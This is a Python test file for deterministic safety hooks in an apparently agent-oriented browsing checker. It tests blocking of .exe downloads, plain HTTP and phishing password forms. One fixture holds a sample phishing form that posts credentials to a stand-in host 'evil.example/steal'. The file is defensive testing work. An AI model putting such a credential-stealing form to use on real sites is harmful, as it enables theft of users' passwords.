#!/usr/bin/env python
"""Quick tests for deterministic hooks. Run: python test_hooks.py"""

import asyncio
from browsecheck.contracts import (
    Decision, HookContext, ObservedAction, PageSnapshot, SiteRef
)
from browsecheck.hooks.download_inspect import DownloadInspectHook
from browsecheck.hooks.credential_phish import CredentialPhishHook
from browsecheck.hooks.cert_ssl import CertSslHook


async def test_download_inspect():
    hook = DownloadInspectHook()

    # Block .exe
    ctx = HookContext(
        user_task="download file",
        proposed_action=ObservedAction(description="download malware.exe"),
        page=PageSnapshot(
            url="https://example.com",
            domain="example.com",
            pending_download={"filename": "malware.exe", "mime": "application/octet-stream", "user_initiated": True}
        ),
        step_index=0,
        session_id="test",
    )
    r = await hook.evaluate(ctx)
    assert r.decision == Decision.BLOCK, f"Should block .exe, got {r.decision}"
    print("✓ download_inspect blocks .exe")

    # Allow .pdf
    ctx.page.pending_download = {"filename": "resume.pdf", "mime": "application/pdf", "user_initiated": True}
    r = await hook.evaluate(ctx)
    assert r.decision == Decision.ALLOW, f"Should allow .pdf, got {r.decision}"
    print("✓ download_inspect allows .pdf")


async def test_credential_phish():
    hook = CredentialPhishHook()

    # Block password field on non-auth domain
    ctx = HookContext(
        user_task="fill form",
        proposed_action=ObservedAction(description="fill password field"),
        page=PageSnapshot(
            url="https://fake-berkeley-hackathon.example/apply",
            domain="fake-berkeley-hackathon.example",
            raw_html='<input type="password" /><form action="https://evil.example/steal"></form>'
        ),
        step_index=0,
        session_id="test",
    )
    r = await hook.evaluate(ctx)
    assert r.decision == Decision.BLOCK, f"Should block phishing form, got {r.decision}"
    assert r.severity.value == "critical", f"Should be critical, got {r.severity}"
    print("✓ credential_phish blocks non-auth password fields")

    # Allow password field on auth domain
    ctx.page.domain = "accounts.google.com"
    ctx.page.url = "https://accounts.google.com/login"
    ctx.page.raw_html = '<input type="password" />'
    r = await hook.evaluate(ctx)
    assert r.decision == Decision.ALLOW, f"Should allow auth domain, got {r.decision}"
    print("✓ credential_phish allows legitimate auth domains")


async def test_cert_ssl():
    hook = CertSslHook()

    # Block HTTP
    ctx = HookContext(
        user_task="test",
        proposed_action=ObservedAction(description="goto page"),
        page=PageSnapshot(
            url="http://example.com",
            domain="example.com",
        ),
        step_index=0,
        session_id="test",
    )
    r = await hook.evaluate(ctx)
    assert r.decision == Decision.BLOCK, f"Should block HTTP, got {r.decision}"
    print("✓ cert_ssl blocks HTTP")

    # Allow HTTPS with valid cert
    ctx.page.url = "https://example.com"
    ctx.page.cert = {"valid": True, "cn": "example.com", "issuer": "Let's Encrypt"}
    r = await hook.evaluate(ctx)
    assert r.decision == Decision.ALLOW, f"Should allow valid HTTPS, got {r.decision}"
    print("✓ cert_ssl allows valid HTTPS")


async def main():
    print("Testing deterministic hooks...\n")
    await test_download_inspect()
    print()
    await test_credential_phish()
    print()
    await test_cert_ssl()
    print("\n✅ All deterministic hooks working")


if __name__ == "__main__":
    asyncio.run(main())
